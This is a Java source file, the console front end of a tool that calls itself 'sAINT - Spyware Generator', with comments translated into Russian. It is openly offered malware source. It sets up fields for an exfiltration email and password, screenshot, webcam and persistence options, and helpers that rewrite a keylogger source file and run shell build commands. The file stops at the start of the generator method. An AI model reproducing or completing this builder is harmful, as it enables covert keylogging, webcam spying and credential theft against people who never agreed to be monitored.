package saint.ui;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.nio.channels.FileChannel;
import java.util.Scanner;
import java.util.concurrent.TimeUnit;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 *
 * @author tiagorlampert
 */
public class sAINT {

    // Константы для цветного вывода текста в консоль
    public static final String RESET = "\u001B[0;1m";
    public static final String BLACK = "\u001B[30;1m";
    public static final String RED = "\u001B[31;1m";
    public static final String GREEN = "\u001B[32;1m";
    public static final String YELLOW = "\u001B[33;1m";
    public static final String BLUE = "\u001B[34;1m";
    public static final String PURPLE = "\u001B[35;1m";
    public static final String CYAN = "\u001B[36;1m";
    public static final String WHITE = "\u001B[37;1m";
    public static Scanner scanner = new Scanner(System.in);
    public static String email;
    public static String password;
    public static int count;
    public static boolean screenshot;
    public static boolean webcam;
    public static boolean persistence;
    public static boolean keep_data;
    public static String path_source = "src/main/java/saint/keylogger/Keylogger.java";

    public static void main(String[] args) throws IOException {
        detectOS();
        clearScreen();
        showMenu();
    }

    // Метод для определения операционной системы
    private static void detectOS() {
        if (!System.getProperty("os.name").toLowerCase().equalsIgnoreCase("linux")) {
            System.out.println("[!] OS is not supported!");
            System.exit(0);
        }
    }

    // Метод для очистки экрана консоли
    private static void clearScreen() {
        System.out.print("\033\143");
    }

    // Метод для ожидания заданного времени
    private static void waitTime(int time) throws InterruptedException {
        TimeUnit.SECONDS.sleep(time);
    }

    // Метод для замены слова в файле
    private static void replaceWord(String oldWord, String newWord, String file_name) {
        try {
            File file = new File(file_name);
            BufferedReader reader = new BufferedReader(new FileReader(file));
            String line = "", oldtext = "";
            while ((line = reader.readLine()) != null) {
                oldtext += line + "\r\n";
            }
            reader.close();
            String newtext = oldtext.replaceAll(oldWord, newWord);
            FileWriter writer = new FileWriter(file_name);
            writer.write(newtext);
            writer.close();
        } catch (IOException ioe) {
            System.out.println(RED + " [!] Error to generate file! " + ioe.getMessage());
            deleteFolder("src/");
            System.exit(0);
        }
    }

    // Метод для копирования папки
    public static void copyFolder(File src, File dest) throws IOException {
        if (src.isDirectory()) {
            if (!dest.exists()) {
                dest.mkdir();
            }
            String files[] = src.list();
            for (String file : files) {
                File srcFile = new File(src, file);
                File destFile = new File(dest, file);
                copyFolder(srcFile, destFile);
            }
        } else {
            InputStream in = new FileInputStream(src);
            OutputStream out = new FileOutputStream(dest);
            byte[] buffer = new byte[1024];
            int length;
            while ((length = in.read(buffer)) > 0) {
                out.write(buffer, 0, length);
            }

            in.close();
            out.close();
        }
    }

    // Метод для удаления папки и её содержимого
    private static void deleteFolder(String path) {
        File folder = new File(path);
        if (folder.exists() && folder.isDirectory()) {
            File[] files = folder.listFiles();
            for (File file : files) {
                file.delete();
            }
        }
    }

    // Метод для проверки существования папки
    private static boolean checkIfFolderExists(String path) {
        File folder = new File(path);
        if (folder.exists() && folder.isDirectory()) {
            return true;
        } else {
            return false;
        }
    }

    // Метод для проверки существования файла
    private static boolean checkIfFileExists(String file) {
        File path_file = new File(file);
        if (path_file.exists()) {
            return true;
        } else {
            return false;
        }
    }

    // Метод для копирования файла
    private static void copyFile(String source, String dest) {
        File sourceFile = new File(source);
        File destFile = new File(dest);
        FileChannel sourceChannel = null;
        FileChannel destChannel = null;
        try {
            sourceChannel = new FileInputStream(sourceFile).getChannel();
            destChannel = new FileOutputStream(destFile).getChannel();
            destChannel.transferFrom(sourceChannel, 0, sourceChannel.size());
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    // Метод для выполнения команды в консоли
    private static void runProcess(String command, String msg) {
        try {
            Process process = Runtime.getRuntime().exec(command);
            System.out.print(GREEN + "\n" + msg);
            try {
                process.waitFor();
            } catch (InterruptedException ex) {
                System.out.println(RED + " [!] Error! " + ex.getMessage());
                System.exit(0);
            }
        } catch (IOException ex) {
            System.out.println(RED + " [!] Error! " + ex.getMessage());
            System.exit(0);
        }
    }

    // Метод для отображения меню
    private static void showMenu() {

        System.out.println(""
                + RED + "      ..   ..                                                        \n"
                + RED + "    pd'     `bq        db      `7MMF'`7MN.   `7MF'MMP\"\"MM\"\"YMM   \n"
                + RED + "   6P         YA      ;MM:       MM    MMN.    M  P'   MM   `7       \n"
                + RED + "  6M' ,pP\"Ybd `Mb    ,V^MM.      MM    M YMb   M       MM           \n"
                + RED + "  MN  8I   `\"  8M   ,M  `MM      MM    M  `MN. M       MM           \n"
                + RED + "  MN  `YMMMa.  8M   AbmmmqMA     MM    M   `MM.M       MM            \n"
                + RED + "  YM. L.   I8 ,M9  A'     VML    MM    M     YMM       MM            \n"
                + RED + "   Mb M9mmmP' dM .AMA.   .AMMA..JMML..JML.    YM     .JMML.          \n"
                + RED + "    Yq.     .pY                                                      \n"
                + RED + "      ``   ''                                 " + GREEN + "  Version: 1.0    \n"
                + YELLOW + "                  (s)AINT - Spyware Generator                    \n"
                + BLUE + "                    Written by tiagorlampert                      \n"
                + WHITE + "                                                                  \n"
                + WHITE + "                      ** DISCLAIMER **                            \n"
                + WHITE + " THIS SOFTWARE IS PROVIDED \"AS IS\" WITHOUT WARRANTY OF ANY KIND.\n"
                + WHITE + " YOU MAY USE THIS SOFTWARE AT YOUR OWN RISK. THE USE IS COMPLETE  \n"
                + WHITE + " RESPONSIBILITY OF THE END-USER. THE DEVELOPERS ASSUME NO         \n"
                + WHITE + " LIABILITY AND ARE NOT RESPONSIBLE FOR ANY MISUSE OR DAMAGE       \n"
                + WHITE + " CAUSED BY THIS PROGRAM.                                          \n"
                + WHITE + "                                                                  \n"
                + WHITE + " Close this window if you wish to exit. Otherwise,                \n"
                + WHITE + " press [ENTER] key to continue..."
        );

        scanner.nextLine();

        showGenerator();
    }

    // Метод для отображения генератора
    private static void showGenerator()
